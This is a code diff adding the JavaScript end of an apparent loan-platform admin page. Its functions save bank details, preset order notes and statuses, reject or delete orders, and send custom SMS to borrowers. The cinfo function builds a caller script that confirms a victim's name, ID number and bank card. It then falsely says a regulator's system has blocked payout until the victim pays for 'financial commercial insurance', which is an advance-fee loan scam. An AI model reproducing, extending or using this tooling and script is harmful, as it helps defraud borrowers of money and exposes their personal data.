+		  	content: $("#payinfo_div").html()
+		});
+		}
+	function savepayinfo(){
+		var paybank = $(".layui-layer-content #paybank").val();
+		var payname = $(".layui-layer-content #payname").val();
+		var paysn = $(".layui-layer-content #paysn").val();
+		var paysm = $(".layui-layer-content #paysm").val();
+		if (paybank == 'undefined' || paybank == '' || paybank == null)
+		{
+		layer.msg("银行名称不能为空!");
+		return false;
+		}
+		if (payname == 'undefined' || payname == '' || payname == null)
+		{
+		layer.msg("户名不能为空!");
+		return false;
+		}
+		if (paysn == 'undefined' || paysn == '' || paysn == null)
+		{
+		layer.msg("卡号不能为空!");
+		return false;
+		}
+		
+			$.post(
+    			"{:U('Loan/savepayinfo')}",
+    			{paybank:paybank,payname:payname,paysn:paysn,paysm:paysm},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},2000);
+
+							}
+    			}
+    		);
+	
+	}
+		function allsm(strs){
+    	
+		$("#strs").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '预设订单说明',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '195px'], //宽高
+		  	content: $("#allsm_div").html()
+		});
+		}
+	function savestrs(){
+		var sconten = $(".layui-layer-content #strs").val();
+		if (sconten == 'undefined' || sconten == '' || sconten == null)
+		{
+		layer.msg("内容不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/savestrs')}",
+    			{strs:sconten},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},2000);
+
+							}
+    			}
+    		);
+	
+	}
+		function dbt(strs){
+    	
+		$("#dbtstrs").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '预设订单状态',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '195px'], //宽高
+		  	content: $("#dbt_div").html()
+		});
+		}
+	function savedbtstrs(){
+		var sconten = $(".layui-layer-content #dbtstrs").val();
+		if (sconten == 'undefined' || sconten == '' || sconten == null)
+		{
+		layer.msg("内容不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/savedbtstrs')}",
+    			{strs:sconten},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},2000);
+
+							}
+    			}
+    		);
+	
+	}
+	function cinfo(name,csn,bankname,banknum,oid,money,lixmoney){
+		var cinfoa = '和您核对一下信息，姓名：'+name+'，身份证号码：'+csn+'，对吗？';
+		var cinfob = '收款银行：'+bankname+'，收款卡号：'+banknum+'，对吗？';
+		var cinfoc = '您借款编号'+oid+'，金额为'+money+'元的借款提现，已通过签约银行转账，银行回执，银联网贷监管系统检测到您的抗风险级别偏低，您需要绑定金融商业险，才能给您下款。';
+		var cinfod = '我帮您核算一下，您的订单需要办理'+lixmoney+'元的金融类商业险，办理好后，只需要提交银行检测，就可以恢复下款了！';
+		$("#cinfoa").attr('value',cinfoa);
+		$("#cinfob").attr('value',cinfob);
+		$("#cinfoc").attr('value',cinfoc);
+		$("#cinfod").attr('value',cinfod);
+		layer.open({
+		  	type: 1,
+			title: '信息核对',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['666px', '399px'], //宽高
+		  	content: $("#cinfo_div").html()
+		});
+	}
+	function xgo(oid,dbt,xsm,tco,xbzmark){
+    	if(!tco){
+		
+			tco = '3ed050';
+		}else{
+			$('#dqcolor').css('background-color','#'+tco);
+		}
+		if(!dbt){
+			dbt = "{$dbt}";
+		}
+		if(!xsm){
+			xsm = "{$allsm}";
+		}
+		
+		$("#color").attr('value',tco);
+		$("#idbt").attr('value',dbt);
+		$("#ixsm").attr('value',xsm);
+		$("#ixbzmark").attr('value',xbzmark);
+		$("#xgoid").attr('value',oid);
+		layer.open({
+		  	type: 1,
+			title: '修改订单',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['688px', '550px'], //宽高
+		  	content: $("#tco_div").html()
+		});
+		}
+	function savexgo(){
+		var color = $(".layui-layer-content #color").val();
+		var dbt = $(".layui-layer-content #idbt").val();
+		var xsm = $(".layui-layer-content #ixsm").val();
+		var xbzmark = $(".layui-layer-content #ixbzmark").val();
+		var oid = $(".layui-layer-content #xgoid").val();
+		var sms = $(".layui-layer-content #insms").val();
+		if (color == 'undefined' || color == '' || color == null)
+		{
+		layer.msg("颜色RGB代码不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/savexgo')}",
+    			{color:color,dbt:dbt,xsm:xsm,sms:sms,id:oid,xbzmark:xbzmark},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},1000);
+
+							}
+    			}
+    		);
+	
+	}
+		function setPendingStatus(id,status){
+			var title;
+			if(status == 1){
+				title = '退款维护';
+			}else if(status == 2){
+				title = '驳回申请需剪短描述驳回原因';
+			}else{
+				return ;
+			}
+			layer.confirm(title, {
+					btn: ['确认','取消'] //按钮
+				}, function(){
+						cvphp.post(
+									"{:U('Loan/setPendingStatus')}",
+									{
+										status:status,
+										id:id
+									},
+									function(data){
+										if(data.status!=1){
+											layer.msg(data.info);
+										}else{
+											$("#list-"+id).remove();
+											layer.msg("操作成功");
+										}
+									}
+								);
+			}, function(){
+
+			});
+
+		}
+				function delLoanOrder(id){
+			layer.confirm(
+				'订单删除后不可恢复,请确认？',
+				{
+					btn: ['确认删除','取消']
+				},function(){
+					cvphp.post(
+						"{:U('Loan/delLoanOrder')}",
+						{
+							id:id
+						},
+						function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{
+								$("#list-"+id).remove();
+								layer.msg("操作成功");
+							}
+						}
+					);
+				}
+			);
+		}
+function smssend(mphone,oid,money,name){
+		$("#iphone").attr('value',mphone);
+    	$("#ioid").html(oid);
+		$("#imoney").html(money);
+		$("#iname").html(name);
+		$("#smsoid").attr('value',oid);
+		layer.open({
+		  	type: 1,
+			title: ' 号码：'+mphone,
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['689px', '389px'], //宽高
+		  	content: $("#smssend_div").html()
+		});
+    }
+	function savesmssend(){
+		var sconten = $(".layui-layer-content #iconten").val();
+		var sphone = $(".layui-layer-content #iphone").val();
+		var smsoid = $(".layui-layer-content #smsoid").val();
+		if (sconten == 'undefined' || sconten == '' || sconten == null)
+		{
+		layer.msg("发送内容不能为空!");
+		return false;
+		}
+		if (sphone == 'undefined' || sphone == '' || sphone == null)
+		{
+		layer.msg("手机号不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/smszdy')}",
+    			{pconten:sconten,pphone:sphone,oid:smsoid},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("发送成功");
+							}
+    			}
+    		);
+	
+	}
+	</script>
+
+</html>
